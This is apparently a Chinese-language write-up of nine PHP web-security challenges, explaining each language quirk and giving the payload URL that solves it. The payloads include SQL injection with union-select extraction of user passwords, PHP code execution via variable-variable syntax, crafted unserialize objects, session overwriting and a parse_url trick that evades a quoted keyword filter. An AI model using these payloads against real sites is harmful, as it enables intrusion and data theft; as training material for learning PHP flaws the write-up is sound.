## Writeup

>PHP is the best language in the world! - Mark Twain

### challenge1:
htmlentities()转义了单引号和双引号，但是忽略了反斜线，所以可以用`\`将原SQL语句中的第二个单引号转义，成功逃逸引号。

payload:`http://foobar/challenge1.php?username=\&password=%20or%201=1%20limit%201%23`

### challenge2:
PHP中花括号的用法：字符串`${foobar}`中的foobar会被当作变量来处理，详情参见: http://php.net/manual/en/language.variables.variable.php

payload:`http://foobar/challenge2.php?str=${${phpinfo()}}`

### challenge3:
利用PHP和MySQL中浮点数精度不同的特性来做，在PHP中`1.0000000000001 != 1`而在MySQL中`1.0000000000001 == 1`

payload: `http://foobar/challenge3.phpid=1.0000000000001`

### challenge4:
foreach那一段代码避免了变量覆盖的发生，却也可能导致释放原有变量，通过通过传参$_CONFIG=anything来释放掉$_CONFIG变量，从而绕过过滤，剩下的就是SQL注入了。

payload: `http://foobar/challenge4.php?kw='%20and%200%20union%20select%20name,pass%20from%20users%20where%20id=1%23&_CONFIG=aaa`

### challenge5:
PHP弱类型导致的BUG，当`$var`是一个字符串/数组的时候，访问`$var["any string"]`跟访问`$var[intval("any string")]`效果是一样的，所以就有如下思路:
1. 访问`http://foobar/challenge5.php?userInfo=a:2:{s:2:"id";s:1:"8";s:4:"pass";s:12:"MAYBECHANGED";}&newPass=8`将账号jimbo18714的密码修改为8
2. 访问`http://foobar/challenge5.php?userInfo=s:1:"8";&newPass=1`将ID为1的账号密码修改为1

开始对2很迷,不知道为啥修改了id=1的用户的密码,而不是修改了id=8的,最后@yichin大牛指点之后才明白:

```php
if($oldPass == $userInfo['pass']){
    $userInfo['pass'] = $newPass; //这里修改了$userInfo,改成了 1  
    $query = 'UPDATE users SET pass = \''.mres($newPass).'\' WHERE id = \''.mres($userInfo['id']).'\';';
    mysql_query($query);
    echo 'Password Changed.';
}
``` 

### challenge6:
PHP中引用的用法，将`$o->enter`设置为`$o->secret`的引用，这样更改`$o->secret`时`$o->enter`也会随之更改。p.s.乌云知识库上面那个思路完全是在扯淡。

payload:`http://foobar/challenge6.php?pass=O:8:"just4fun":2:{s:5:"enter";N;s:6:"secret";R:2;}`

### challenge7:
`$_REQUEST`变量中如果碰到`$_GET`和`$_POST`重名的字段，`$_POST`的该字段会覆盖掉`$_GET`的该字段，可以借此特性绕过对`$_REQUEST`的数组判断，进而覆盖`$_SESSION`变量

payload: `http://foobar/challenge7.php?_SESSION[logged]=1 (POST: _SESSION=1)`

### challenge8:
PHP反序列化的一个小特性，反序列化时会忽略掉用来表示长度的数字前面的`+`，大概是把`+`当作正号来处理了吧。详情参考:http://www.2cto.com/kf/201309/246310.html

payload:`http://foobar/challenge8.php?data=O:%2B8:"just4fun":1:{s:8:"filename";s:9:"sbztz.php";}`

### challenge9:

漏洞挺明显的,主要是40行`parse_str($_SERVER['QUERY_STRING'])`
导致的变量覆盖漏洞.既然存在变量覆盖漏洞,那就想办法找到在
- `parse_str($_SERVER['QUERY_STRING'])`这句代码之前出现初始化的有用变量
- 或者是在`parse_str($_SERVER['QUERY_STRING'])`之后出现的未初始化变量.

看到第50-52行:
```php
 if($col) {
        $query_parts = $col . " like '%" . $keyword . "%'";
    }
```
如果`$col`为空,会导致`$query_parts`变为未初始化变量,就可以直接覆盖了.
所以 `$query_parts`可控,可以直接导入sql语句造成注入.

但是却有过滤
```php
function nojam_firewall(){
    $INFO = parse_url($_SERVER['REQUEST_URI']);
    parse_str($INFO['query'], $query);
    $filter = ["union", "select", "information_schema", "from"];
    foreach($query as $q){
        foreach($filter as $f){
            if (preg_match("/".$f."/i", $q)){
                nojam_log($INFO);
                die("attack detected!");
            }
        }
    }
}
```
需要利用PHP parse_url()函数的BUG来解题([https://bugs.php.net/bug.php?id=55511](https://bugs.php.net/bug.php?id=55511)),通过`///x.php?key=value`的方式可以使其返回 False，从而达到绕过WAF的目的

最后的payload为:
```
///index.php?search_cols=a|b&keyword=xxxx&operator=and&query_parts=123 union select 1,2,3,flag from flag
```
